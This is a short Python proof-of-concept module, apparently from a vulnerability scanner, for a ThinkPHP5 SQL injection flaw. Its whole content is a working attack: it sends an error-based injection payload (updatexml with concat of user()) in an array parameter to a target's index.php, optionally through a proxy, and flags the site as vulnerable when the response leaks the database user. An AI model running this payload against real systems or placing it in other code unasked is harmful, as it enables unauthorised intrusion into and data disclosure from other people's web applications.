import requests
import random
import re

#Thinkphp5 sql注入漏洞
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    header = {'User-Agent': user_agent}

    #漏洞位置
    exploit_url=url+'/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(exploit_url, headers=header, proxies=proxies)

    else:
        response = requests.get(exploit_url, headers=header)
    # with open('b.html','wb') as f:
    #     f.write(response.content)
    # print(response.text)
    if response.status_code==200 :
        if re.search('~+[0-9a-zA-Z]*@',response.text):
            return 'Thinkphp5 - sql注入漏洞'


def run(url,logindict,user_agent,proxies):
    result = poc(url,logindict,user_agent,proxies)
    return result

# run("http://192.168.1.144:8080/",{'admin':'admin'},'','')